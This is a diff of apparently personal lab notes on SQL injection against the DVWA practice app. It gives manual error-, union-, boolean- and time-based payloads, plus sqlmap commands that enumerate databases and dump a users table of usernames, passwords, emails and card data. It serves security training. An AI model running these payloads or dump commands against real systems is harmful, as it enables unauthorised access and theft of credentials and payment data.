@@ -1,24 +1,47 @@
 A. SQLi (**DVWA & Burp Suite**) -> Manual
 
-1. Classic SQLi (Error-Based)
+1. Classic SQLi (Error-Based):
 id=1 -> shows 1 record
 id=1' -> error
 id=1' OR '1'='1 -> shows all records
 
-2. Union-Based SQLi
+2. Union-Based SQLi:
 id=1' ORDER BY 1# , 2# , ... until error occurs (confirms column count)
 id=1' ORDER BY 3# -> error (2 columns here)
 id=1' UNION SELECT 1,2# -> shows output of 2 columns (confirms union sqli works)
 id=1' UNION SELECT @@version,2# -> db version leaked 
 
-3. Blind SQLi (Boolean-Based)
+3. Blind SQLi (Boolean-Based):
 id=1' AND 1=1# -> data returned
 id=1' AND 1=2# -> no error but no data returned as well 
 
-4. Time-Based Blind SQLi
+4. Time-Based Blind SQLi:
 id=1' AND SLEEP(5)# -> response delayed by 5 secs, no data returned
 
 
 B. SQLi (**SQLMap**) -> Automated
 
+1. Basic Test:
+kali$ sqlmap -u "http://192.168.56.101/DVWA/vulnerabilities/sqli/?id=1" --batch --level=1 --risk=1
+-> confirms injection point
+
+2. Identify DBMS:
+kali$ sqlmap -u "http://192.168.56.101/DVWA/vulnerabilities/sqli/?id=1" --banner --batch
+-> shows DB version
+
+3. Enumerate Available DBs:
+kali$ sqlmap -u "http://192.168.56.101/DVWA/vulnerabilities/sqli/?id=1" --dbs --batch
+-> list of DBs dumped
+
+4. Choose one DB & list tables:
+kali$ sqlmap -u "http://192.168.56.101/DVWA/vulnerabilities/sqli/?id=1" -D acuart --tables --batch
+-> tables found in 'acuart' DB
+
+5. Extract columns from a table:
+kali$ sqlmap -u "http://192.168.56.101/DVWA/vulnerabilities/sqli/?id=1" -D acuart -T users --columns --batch
+-> columns inside 'users' table
+
+6. Dump data from 'users' table:
+kali$ sqlmap -u "http://192.168.56.101/DVWA/vulnerabilities/sqli/?id=1" -D acuart -T users -C uname,pass,email,cc,cart --dump --batch
+-> extracted usernames and password hashes or values
 
